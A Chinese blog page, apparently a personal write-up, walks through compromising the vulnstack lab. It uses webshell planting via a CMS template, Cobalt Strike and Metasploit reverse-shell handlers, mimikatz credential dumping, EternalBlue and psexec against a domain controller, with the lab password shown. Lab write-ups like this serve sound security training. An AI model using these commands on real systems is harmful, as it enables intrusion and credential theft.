@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Drblack'Blog | Drblack'Blog</title><meta name="author" content="Drblack"><meta name="copyright" content="Drblack"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnstack（一）记录人：drblack   靶机地址：http:&#x2F;&#x2F;.&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F; 靶机环境mac：cs-client端 192.168.3.8    kali：cs-serve端：192.168.3.10 web服务器：192.168.3.29  192.168.52.143 DC：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Drblack&#39;Blog">
+<meta property="og:url" content="https://drblack000.github.io/2023/09/09/vulnstack%20%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Drblack&#39;Blog">
+<meta property="og:description" content="vulnstack（一）记录人：drblack   靶机地址：http:&#x2F;&#x2F;.&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F; 靶机环境mac：cs-client端 192.168.3.8    kali：cs-serve端：192.168.3.10 web服务器：192.168.3.29  192.168.52.143 DC：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://drblack000.github.io/img/1000.webp">
+<meta property="article:published_time" content="2023-09-09T11:01:38.922Z">
+<meta property="article:modified_time" content="2023-09-10T13:06:47.241Z">
+<meta property="article:author" content="Drblack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://drblack000.github.io/img/1000.webp"><link rel="shortcut icon" href="/img/1000.webp"><link rel="canonical" href="https://drblack000.github.io/2023/09/09/vulnstack%20%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8KYdLccZEOQiOgJvHftvX7-2pkkmhBMvMXO4inbIkLw"/><meta name="baidu-site-verification" content="codeva-t56Dl5qqYL"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Drblack\'Blog',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-10 21:06:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1000.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Drblack'Blog"><span class="site-name">Drblack'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-09T11:01:38.922Z" title="发表于 2023-09-09 19:01:38">2023-09-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-10T13:06:47.241Z" title="更新于 2023-09-10 21:06:47">2023-09-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">957</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnstack（一）"><a href="#vulnstack（一）" class="headerlink" title="vulnstack（一）"></a>vulnstack（一）</h1><p>记录人：drblack   靶机地址：http:&#x2F;&#x2F;.&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;</p>
+<h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>mac：cs-client端 192.168.3.8   </p>
+<p>kali：cs-serve端：192.168.3.10</p>
+<p>web服务器：192.168.3.29  192.168.52.143</p>
+<p>DC：192.168.52.138</p>
+<p>pc：192.168.52.141</p>
+<p><img src="/images/image-20230910163320210.png" alt="image-20230910163320210"></p>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.3.0/24 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910133513877.png" alt="image-20230910133513877"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.3.29</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910133659198.png" alt="image-20230910133659198"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sC -O -sV -p80,135,139,192,445,1025,1026,3306,5357 192.168.3.29  #操作系统 端口信息检测</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910134035236.png" alt="image-20230910134035236"></p>
+<p><img src="/images/image-20230910134245984.png" alt="image-20230910134245984"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --script=vuln -p80,135,139,192,445,1025,1026,3306,5357 192.168.3.29</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910135146830.png" alt="image-20230910135146830"></p>
+<p>目录扫描结果如下</p>
+<p><img src="/images/image-20230910134637651.png" alt="image-20230910134637651"></p>
+<p>phpmyadmin  root-root可以进入</p>
+<p><img src="/images/image-20230910134803310.png" alt="image-20230910134803310"></p>
+<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>进入后可以看见左侧有newyxcms系统，尝试拼接路径进行访问</p>
+<p><img src="/images/image-20230910134847219.png" alt="image-20230910134847219"></p>
+<p>找到路径根据右侧公告栏进入后台</p>
+<p><img src="/images/image-20230910135319437.png" alt="image-20230910135319437"></p>
+<p>输入账户密码 admin 123456</p>
+<p><img src="/images/image-20230910155038149.png" alt="image-20230910155038149"></p>
+<p>直接利用searchploit搜寻yxcms没有结果，尝试进行审计</p>
+<p><img src="/images/image-20230910155313786.png" alt="image-20230910155313786"></p>
+<p><img src="/images/image-20230910155455897.png" alt="image-20230910155455897"></p>
+<p>模版文件此处似乎可以直接修改php文件，在layout.php此处加上一句话马，分析其可能在网站中存在的位置</p>
+<p><img src="/images/image-20230910155531192.png" alt="image-20230910155531192"></p>
+<p>这里有几种方法，第一种去找其网站开源源码，找到文件的路径去连shell，第二种是看这个源码，如下图，其显示内容和之前首页的内容吻合，说明被index加载了，可以直接尝试连index试试</p>
+<p><img src="/images/image-20230910155639882.png" alt="image-20230910155639882"></p>
+<p>连接成功</p>
+<p><img src="/images/image-20230910155933279.png" alt="image-20230910155933279"></p>
+<p><img src="/images/image-20230910135435877.png" alt="image-20230910135435877"></p>
+<h3 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h3><p>配置监听并生成木马传到目标主机</p>
+<p><img src="/images/image-20230910161115743.png" alt="image-20230910161115743"></p>
+<p><img src="/images/image-20230910161024444.png" alt="image-20230910161024444"></p>
+<p>运行木马文件</p>
+<p><img src="/images/image-20230910161221201.png" alt="image-20230910161221201"></p>
+<p>cs上线</p>
+<p><img src="/images/image-20230910161242416.png" alt="image-20230910161242416"></p>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910161520774.png" alt="image-20230910161520774"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net view</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910161548431.png" alt="image-20230910161548431"></p>
+<p>查看本机ip，发现是双网卡机器。存在内网网段192.168.52.0&#x2F;24</p>
+<p><img src="/images/image-20230910161626825.png" alt="image-20230910161626825"></p>
+<p>运用插件扫描网段，探测存活主机</p>
+<p><img src="/images/image-20230910161756925.png" alt="image-20230910161756925"></p>
+<p>有效的是143（本机），138和141，上面的52.1是网卡，52.2不知道是什么情况，后面搞明白了回来更正。</p>
+<p><img src="/images/image-20230910161927021.png" alt="image-20230910161927021"></p>
+<h3 id="通过CS联动MSF"><a href="#通过CS联动MSF" class="headerlink" title="通过CS联动MSF"></a>通过CS联动MSF</h3><p>msf操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.3.8</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230909191340583.png" alt="image-20230909191340583"></p>
+<p>cs创建listener</p>
+<p><img src="/images/image-20230909191303057.png" alt="image-20230909191303057"></p>
+<p>spawn</p>
+<p><img src="/images/image-20230909191536597.png" alt="image-20230909191536597"></p>
+<p>选择设置的msf监听</p>
+<p><img src="/images/image-20230909191552795.png" alt="image-20230909191552795"></p>
+<p>msf监听到会话，成功从cs反弹到msf</p>
+<p><img src="/images/image-20230909191639699.png" alt="image-20230909191639699"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001  #msf改编码</span><br></pre></td></tr></table></figure>
+
+<p>添加路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230909210043499.png" alt="image-20230909210043499"></p>
+<h2 id="拿域控（多方法）"><a href="#拿域控（多方法）" class="headerlink" title="拿域控（多方法）"></a>拿域控（多方法）</h2><h3 id="CS-传递攻击"><a href="#CS-传递攻击" class="headerlink" title="CS+传递攻击"></a>CS+传递攻击</h3><p>利用mimikatz抓取本地密码，因为目前的用户是god\administrator为域管理员，所以可以通过传递攻击直接拿下域控</p>
+<p><img src="/images/image-20230910162319348.png" alt="image-20230910162319348"></p>
+<p>junp-psexec选择攻击方式，设置监听</p>
+<p><img src="/images/image-20230910162439061.png" alt="image-20230910162439061"></p>
+<p><img src="/images/image-20230910162546362.png" alt="image-20230910162546362"></p>
+<p>可以看见上线了域控</p>
+<p><img src="/images/image-20230910162626624.png" alt="image-20230910162626624"></p>
+<p><img src="/images/image-20230910162819593.png" alt="image-20230910162819593"></p>
+<h3 id="MSF-ms17-010"><a href="#MSF-ms17-010" class="headerlink" title="MSF+ms17_010"></a>MSF+ms17_010</h3><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010 #扫描是否存在漏洞</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.138 #设置目标机器</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230909210343647.png" alt="image-20230909210343647"></p>
+<p><img src="/images/image-20230909210446027.png" alt="image-20230909210446027"></p>
+<p>根据结果显示目标机器存在永恒之蓝</p>
+<p><img src="/images/image-20230909210459951.png" alt="image-20230909210459951"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windwos/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set lport 1111</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910093521668.png" alt="image-20230910093521668"></p>
+<p>此处有两个问题：</p>
+<p>1.为什么第一次bind 192.168.3.8:1111失败，然后去连接0.0.0.0:1111（应该是广播吧）又能够成功连接到3.8（端口不存在占用）</p>
+<p>2.为什么会创建几十个sessions</p>
+<p><img src="/images/image-20230910093540302.png" alt="image-20230910093540302"></p>
+<p>由于出现了上述问题，利用ms1701_psexec模块进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set lport 1111</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910093458451.png" alt="image-20230910093458451"></p>
+<p>攻击成功并成功建立会话</p>
+<p><img src="/images/image-20230910093807472.png" alt="image-20230910093807472"></p>
+<h3 id="MSF-票据传递攻击"><a href="#MSF-票据传递攻击" class="headerlink" title="MSF+票据传递攻击"></a>MSF+票据传递攻击</h3><p>账户是god\administrater</p>
+<p><img src="/images/image-20230910094457244.png" alt="image-20230910094457244"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem #提权</span><br></pre></td></tr></table></figure>
+
+<p>方便后续操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain #查看域内管理员</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910094937744.png" alt="image-20230910094937744"></p>
+<p>可以看到 GOD\Administrator是我们的域管理员，那可以直接利用其令牌进行横向移动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为什么可以 dir \\owa\c$</span><br><span class="line">而不能 dir \\liukaifeng01\c$  失败</span><br></pre></td></tr></table></figure>
+
+<h4 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h4><p>使用kiwi抓取本地密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all </span><br></pre></td></tr></table></figure>
+
+<p>可以发现无法抓取成功，因为是x86(32位)进程不能抓去64位的机器，需要进行进程迁移<img src="/images/image-20230910112035383.png" alt="image-20230910112035383"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps #列出当前进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910112149725.png" alt="image-20230910112149725"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 进程号 #窃取令牌 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910112224814.png" alt="image-20230910112224814"></p>
+<p>因为之前修改了密码，所以进行了打码，可以看见成功抓取了本地administrator的密码</p>
+<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windwos/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbdomain god</span><br><span class="line">set smbpass hongrisec@2019</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230910101125898.png" alt="image-20230910101125898"></p>
+<p><img src="/images/image-20230910101146601.png" alt="image-20230910101146601"></p>
+<p>成功拿下域控</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drblack000.github.io">Drblack</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drblack000.github.io/2023/09/09/vulnstack%20%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">https://drblack000.github.io/2023/09/09/vulnstack%20%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drblack000.github.io" target="_blank">Drblack'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/1000.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="/images"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">/images</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1000.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Drblack</div><div class="author-info__description">努力就会一直幸运</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/drblack000"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drblack000" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:drblack_di@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnstack%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">vulnstack（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">靶机环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.2.1.</span> <span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFcs"><span class="toc-number">1.2.2.</span> <span class="toc-text">上线cs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">1.3.</span> <span class="toc-text">内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">内网信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87CS%E8%81%94%E5%8A%A8MSF"><span class="toc-number">1.3.2.</span> <span class="toc-text">通过CS联动MSF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%9F%9F%E6%8E%A7%EF%BC%88%E5%A4%9A%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">拿域控（多方法）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.1.</span> <span class="toc-text">CS+传递攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-ms17-010"><span class="toc-number">1.4.2.</span> <span class="toc-text">MSF+ms17_010</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 